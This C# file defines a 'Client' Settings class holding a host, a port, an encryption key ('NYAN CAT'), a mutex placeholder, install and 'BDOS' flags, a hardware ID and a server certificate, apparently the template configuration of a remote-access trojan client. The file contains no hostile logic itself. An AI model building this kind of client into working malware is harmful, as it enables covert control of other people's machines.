using Client.Helper;
using System.Security.Cryptography.X509Certificates;

namespace Client
{
    public static class Settings
    {
        public static string Ports = "6606";
        public static string Hosts = "127.0.0.1";
        public static string Version = "2.0";
        public static string Install = "false";
        public static string Key = "NYAN CAT";
        public static string MTX = "%MTX%";
        public static X509Certificate2 ServerCertificate;
        public static string BDOS = "false";
        public static string Hwid = HwidGen.HWID();
        public static string Delay = "0";
    }
}